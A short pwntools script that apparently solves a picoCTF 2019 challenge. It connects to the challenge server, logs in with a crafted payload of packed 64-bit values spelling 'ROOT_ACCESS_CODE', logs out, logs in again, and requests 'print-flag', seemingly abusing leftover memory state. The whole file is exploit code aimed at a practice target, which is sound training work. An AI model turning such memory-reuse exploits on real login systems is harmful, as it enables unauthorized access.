from pwn import *
s = remote('2019shell1.picoctf.com' ,45173)
# s = a.process('./auth')
raw_input('debug')
s.sendline('login')
s.sendline('35')
ac1 = 0x4343415f544f4f52
ac2 = 0x45444f435f535345
payload = p64(ac1)
payload += p64(ac1)
payload += p64(ac2)
payload += p64(ac2)
s.sendline(payload)

s.recvuntil('\nEnter your command:')
s.sendline('logout')

s.recvuntil('\nEnter your command:')
s.sendline('login')
s.sendline('7')
s.sendline('tuan')

s.recvuntil('\nEnter your command:')
s.sendline('print-flag')
s.interactive()